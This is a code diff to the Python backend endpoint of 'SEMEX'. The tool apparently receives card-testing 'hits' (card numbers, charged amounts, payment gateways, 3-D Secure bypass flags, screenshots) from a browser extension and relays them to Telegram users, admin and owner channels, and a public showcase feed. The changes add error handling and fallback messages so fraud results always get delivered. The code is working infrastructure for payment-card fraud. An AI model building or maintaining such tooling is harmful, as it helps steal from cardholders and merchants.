@@ -372,63 +372,94 @@ async def submit_status(
     if not should_forward:
         return {"success": True, "hitId": hit_id, "forwarded": False}
 
-    # Format message
+    # ── Build hit/user dicts ─────────────────────────────────────────────────
     hit_dict = hit.model_dump()
     hit_dict["three_ds_bypassed"] = str(body.threeDSBypassed or "").lower() in ("true", "1")
     user_dict = user.model_dump()
     user_dict["is_owner"] = is_admin  # effective admin (flag OR configured ADMIN_TELEGRAM_ID)
-    text = format_hit(hit_dict, user_dict, admin_view=False)
 
-    # Telegram's photo-caption limit (1024) applies to VISIBLE text, not the HTML
-    # markup we send (tags + link hrefs don't count). Measure visible length so the
-    # full details stay attached to the screenshot whenever they truly fit; only
-    # fall back to a separate follow-up message when the visible text is too long.
+    # format_hit was previously called outside any try/except — a bad field value
+    # would 500 the endpoint AFTER the hit was already saved to DB, making the
+    # extension show an error while the hit sat silently in the DB with no notification.
+    # Wrap it so any formatting exception degrades gracefully to a plaintext fallback.
+    try:
+        text = format_hit(hit_dict, user_dict, admin_view=False)
+    except Exception as _fmt_err:
+        log.warning("format_hit failed (%s) — using plaintext fallback", _fmt_err)
+        text = None
+
     def _visible_len(s: str) -> int:
         return len(re.sub(r"<[^>]+>", "", s or ""))
 
     def _photo_caption(full_text: str) -> str:
         return full_text if _visible_len(full_text) <= 1024 else "⚜️ <b>SEMEX</b> — CHARGED ✅ (details below)"
 
-    # Send to user
+    # Absolute-fallback message: pure ASCII plaintext, zero HTML markup.
+    # Used when format_hit threw OR when Telegram rejects even the plain-text
+    # retry (e.g. network blip). Guaranteed to be accepted by Telegram.
+    def _fallback_text() -> str:
+        num = number or "????"
+        masked = ("*" * max(0, len(num) - 4) + num[-4:]) if len(num) > 4 else num
+        amt_str = f"{body.amount} {(body.currency or 'USD').upper()}" if body.amount else "unknown amount"
+        handle = user_dict.get("telegram_username") or user_dict.get("telegram_first_name") or str(user.telegram_id)
+        return (
+            f"SEMEX CHARGED HIT\n"
+            f"Card: {masked}\n"
+            f"Amount: {amt_str}\n"
+            f"Gateway: {body.gateway or 'unknown'}\n"
+            f"User: @{handle}"
+        )
+
+    # ── Send to user DM ───────────────────────────────────────────────────────
     user_msg_id: Optional[int] = None
+    _user_tg_res: Optional[dict] = None
     try:
         sent_photo = False
-        if is_charged and body.screenshot:
+        if is_charged and body.screenshot and text:
             try:
                 img = base64.b64decode(body.screenshot)
                 res = await send_photo(user.telegram_id, img, _photo_caption(text))
+                _user_tg_res = res
                 if res and res.get("ok"):
                     user_msg_id = res.get("result", {}).get("message_id")
                     sent_photo = True
-                    # If caption was truncated, send full details separately.
                     if _visible_len(text) > 1024:
                         await send_message(user.telegram_id, text)
             except Exception as e:
                 log.warning("user send_photo error: %s", e)
-        # Fallback: if photo was not sent (failed or not applicable), send text.
         if not sent_photo:
-            res = await send_message(user.telegram_id, text)
-            if res and res.get("ok"):
-                user_msg_id = res.get("result", {}).get("message_id")
+            if text:
+                res = await send_message(user.telegram_id, text)
+                _user_tg_res = res
+                if res and res.get("ok"):
+                    user_msg_id = res.get("result", {}).get("message_id")
+            # Hard fallback: if formatted send failed or text is None, send a
+            # simple plaintext message so the notification always arrives.
+            if not user_msg_id:
+                log.warning("formatted DM failed (tg=%s) — sending plaintext fallback", _user_tg_res)
+                res = await send_message(user.telegram_id, _fallback_text(), parse_mode="")
+                _user_tg_res = res
+                if res and res.get("ok"):
+                    user_msg_id = res.get("result", {}).get("message_id")
     except Exception as e:
         log.warning("user forward failed: %s", e)
 
-    # Pin charged messages in user's chat
     if is_charged and user_msg_id:
         try:
             await pin_message(user.telegram_id, user_msg_id, disable_notification=True)
         except Exception as e:
             log.warning("user pin failed: %s", e)
 
-    # SILENT admin log — ONLY for non-admin users' CHARGED hits.
-    # LIVE hits are NEVER sent to the admin log (public + user DM only, per policy).
-    # Admin's own hits stay in admin's DM only (already sent above).
+    # ── Admin log / owner mirror ──────────────────────────────────────────────
     admin_msg_id: Optional[int] = None
     if not is_admin and is_charged:
         try:
-            admin_text = format_hit(hit_dict, user_dict, admin_view=True)
+            try:
+                admin_text = format_hit(hit_dict, user_dict, admin_view=True)
+            except Exception:
+                admin_text = None
             sent_admin_photo = False
-            if is_charged and body.screenshot:
+            if is_charged and body.screenshot and admin_text:
                 try:
                     img = base64.b64decode(body.screenshot)
                     res = await send_photo(settings.ADMIN_LOG_CHANNEL_ID, img, _photo_caption(admin_text))
@@ -440,28 +471,28 @@ async def submit_status(
                 except Exception as e:
                     log.warning("admin send_photo error: %s", e)
             if not sent_admin_photo:
-                res = await send_message(settings.ADMIN_LOG_CHANNEL_ID, admin_text)
+                _atxt = admin_text or _fallback_text()
+                _apm = "HTML" if admin_text else ""
+                res = await send_message(settings.ADMIN_LOG_CHANNEL_ID, _atxt, parse_mode=_apm)
                 if res and res.get("ok"):
                     admin_msg_id = res.get("result", {}).get("message_id")
         except Exception as e:
             log.warning("admin log failed: %s", e)
 
-        # Pin charged in admin channel too
         if is_charged and admin_msg_id:
             try:
                 await pin_message(settings.ADMIN_LOG_CHANNEL_ID, admin_msg_id, disable_notification=True)
             except Exception as e:
                 log.warning("admin pin failed: %s", e)
 
-    # OWNER DM MIRROR — when a promoted admin (not the owner) fires a CHARGED hit,
-    # the owner still wants to see it. The private admin-log channel is skipped for
-    # admin-generated hits (above), but the owner gets a personal DM copy so
-    # nothing slips past them. LIVE hits are NOT mirrored (public + user DM only).
     elif is_charged and user.telegram_id != settings.ADMIN_TELEGRAM_ID:
         try:
-            admin_text = format_hit(hit_dict, user_dict, admin_view=True)
+            try:
+                admin_text = format_hit(hit_dict, user_dict, admin_view=True)
+            except Exception:
+                admin_text = None
             sent_owner_photo = False
-            if is_charged and body.screenshot:
+            if is_charged and body.screenshot and admin_text:
                 try:
                     img = base64.b64decode(body.screenshot)
                     res = await send_photo(settings.ADMIN_TELEGRAM_ID, img, _photo_caption(admin_text))
@@ -472,13 +503,13 @@ async def submit_status(
                 except Exception as e:
                     log.warning("owner mirror send_photo error: %s", e)
             if not sent_owner_photo:
-                await send_message(settings.ADMIN_TELEGRAM_ID, admin_text)
+                _otxt = admin_text or _fallback_text()
+                _opm = "HTML" if admin_text else ""
+                await send_message(settings.ADMIN_TELEGRAM_ID, _otxt, parse_mode=_opm)
         except Exception as e:
             log.warning("owner mirror failed: %s", e)
 
-    # PUBLIC SHOWCASE — for both CHARGED and LIVE hits, if channel configured.
-    # Public info only: user (masked), status, gateway, response. NO card/amount/email.
-    # Admin can mute individual users from the public feed via public_muted=True.
+    # ── Public showcase ───────────────────────────────────────────────────────
     if should_forward and settings.PUBLIC_SHOWCASE_CHANNEL_ID and not getattr(user, "public_muted", False):
         try:
             public_text = format_public_showcase(hit_dict, user_dict)
@@ -486,7 +517,20 @@ async def submit_status(
         except Exception as e:
             log.warning("public showcase failed: %s", e)
 
-    return {"success": True, "hitId": hit_id, "forwarded": True, "pinned": is_charged}
+    # Include tg_debug in the response so the extension's background.js
+    # console.log([SEMEX/bg] submitStatus response: ...) shows the exact
+    # Telegram error — makes future silent-failure diagnosis instant.
+    _actually_forwarded = user_msg_id is not None
+    _tg_err = None if _actually_forwarded else (
+        _user_tg_res.get("description") if isinstance(_user_tg_res, dict) else "no_tg_response"
+    )
+    return {
+        "success": True,
+        "hitId": hit_id,
+        "forwarded": _actually_forwarded,
+        "pinned": is_charged,
+        "tg_debug": _tg_err,
+    }
 
 
 @router.post("/screenshot")
